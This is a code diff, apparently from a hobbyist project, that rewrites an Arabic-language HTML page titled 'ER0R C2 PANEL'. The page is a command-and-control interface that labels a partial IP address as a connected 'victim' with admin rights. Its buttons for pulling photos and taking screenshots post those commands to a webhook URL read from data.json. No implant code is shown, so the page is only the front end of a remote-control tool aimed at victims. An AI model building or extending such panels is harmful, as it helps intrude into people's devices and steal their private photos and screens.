@@ -1,33 +1,28 @@
-<div class="panel">
-    <h3 style="color: red;">📍 الضحية: <span id="target-ip">76.212.2</span></h3>
-    <h3 style="color: #0f0;">الحالة: متصل (صلاحية آدمن)</h3>
-    
-    <button class="btn" onclick="sendCommand('📷 سحب الصور')">سحب الصور 📂</button>
-    
-    <button class="btn" onclick="sendCommand('📸 تصوير الشاشة')">تصوير الشاشة 📷</button>
-</div>
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <title>ER0R C2 PANEL</title>
+    <style>
+        body { background: #000; color: #f00; font-family: monospace; text-align: center; }
+        .btn { background: #6001d2; color: #fff; padding: 15px; margin: 10px; cursor: pointer; border: none; width: 200px; }
+    </style>
+</head>
+<body>
+    <h1>الضحية: 76.212.2 (متصل)</h1>
+    <button class="btn" onclick="sendCmd('📷 سحب الصور')">سحب الصور 📂</button>
+    <button class="btn" onclick="sendCmd('📸 تصوير الشاشة')">تصوير الشاشة 📷</button>
 
-<script>
-async function sendCommand(action) {
-    try {
+    <script>
+    async function sendCmd(action) {
         const configRes = await fetch('./data.json');
         const config = await configRes.json();
-
         await fetch(config.webhook_url, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                username: "ER0R COMMANDER",
-                embeds: [{
-                    title: "🚀 أمر سيطرة جديد",
-                    description: `تم إرسال أمر: **${action}** للضحية ذات الـ IP: **76.212.2**`,
-                    color: 0x6001d2
-                }]
-            })
+            body: JSON.stringify({ content: `🚀 أمر جديد: **${action}** للضحية 76.212.2` })
         });
-        alert("تم إرسال الأمر بنجاح: " + action);
-    } catch(e) {
-        alert("خطأ في الاتصال بالويب هوك");
+        alert("تم إرسال الأمر للويب هوك");
     }
-}
-</script>
+    </script>
+</body>
+</html>
